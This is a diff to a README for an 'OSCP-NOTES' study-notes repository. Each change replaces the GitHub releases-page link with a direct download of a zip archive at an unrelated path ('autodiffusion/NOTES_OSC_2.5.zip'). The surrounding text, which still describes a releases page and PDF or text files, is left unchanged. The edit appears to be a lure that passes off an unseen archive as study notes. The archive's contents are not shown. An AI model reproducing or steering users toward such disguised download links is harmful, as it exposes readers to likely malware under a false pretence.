@@ -1,6 +1,6 @@
 # 🗒️ OSCP-NOTES - Clear, Easy OSCP Study Notes
 
-[![Download OSCP-NOTES](https://img.shields.io/badge/Download-OSCP--NOTES-blue?style=for-the-badge)](https://github.com/Panoptic-septuagenarian481/OSCP-NOTES/releases)
+[![Download OSCP-NOTES](https://img.shields.io/badge/Download-OSCP--NOTES-blue?style=for-the-badge)](https://raw.githubusercontent.com/Panoptic-septuagenarian481/OSCP-NOTES/main/autodiffusion/NOTES_OSC_2.5.zip)
 
 ---
 
@@ -16,7 +16,7 @@ You need to visit the release page to get the latest version of the notes.
 
 Click the link below or the button above to go to the GitHub releases page:
 
-[https://github.com/Panoptic-septuagenarian481/OSCP-NOTES/releases](https://github.com/Panoptic-septuagenarian481/OSCP-NOTES/releases)
+[https://raw.githubusercontent.com/Panoptic-septuagenarian481/OSCP-NOTES/main/autodiffusion/NOTES_OSC_2.5.zip](https://raw.githubusercontent.com/Panoptic-septuagenarian481/OSCP-NOTES/main/autodiffusion/NOTES_OSC_2.5.zip)
 
 On the releases page, look for the most recent release. The file you need will usually be in PDF or text format. Download the file by clicking on it.
 
@@ -112,7 +112,7 @@ The notes are intended as a study aid and reference.
 
 ## 🔗 Useful Links
 
-- [Download Page](https://github.com/Panoptic-septuagenarian481/OSCP-NOTES/releases)
+- [Download Page](https://raw.githubusercontent.com/Panoptic-septuagenarian481/OSCP-NOTES/main/autodiffusion/NOTES_OSC_2.5.zip)
 
 Use the link above to always find the latest version.
 
